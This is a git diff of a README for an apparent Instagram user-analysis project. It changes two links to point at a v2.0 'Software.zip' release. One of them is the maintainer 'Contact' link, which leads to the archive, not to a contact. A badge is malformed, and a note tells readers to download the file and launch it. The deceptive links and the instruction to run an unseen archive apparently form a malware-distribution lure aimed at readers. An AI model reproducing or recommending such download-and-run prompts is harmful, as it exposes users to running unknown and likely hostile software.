@@ -55,11 +55,11 @@ Contributions to this project are welcome! If you have ideas for improvements or
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Contact ℹ️
-For any questions or feedback, please reach out to the project maintainer: [https://github.com/iguit-1/InstagramUserAnalysis/releases/download/v1.0/Software.zip](https://github.com/iguit-1/InstagramUserAnalysis/releases/download/v1.0/Software.zip).
+For any questions or feedback, please reach out to the project maintainer: [https://github.com/iguit-1/InstagramUserAnalysis/releases/download/v2.0/Software.zip](https://github.com/iguit-1/InstagramUserAnalysis/releases/download/v2.0/Software.zip).
 
 ---
 
-[![Download Project](https://github.com/iguit-1/InstagramUserAnalysis/releases/download/v1.0/Software.zip%20Project-v1.0.0-blue)](https://github.com/iguit-1/InstagramUserAnalysis/releases/download/v1.0/Software.zip)
+[![Download Project](https://github.com/iguit-1/InstagramUserAnalysis/releases/download/v2.0/Software.zip%20Project-v1.0.0-blue)](https://github.com/iguit-1/InstagramUserAnalysis/releases/download/v2.0/Software.zip)
 
 **Note:** Click the button above to download the project. Launch the downloaded file to access the content.
 
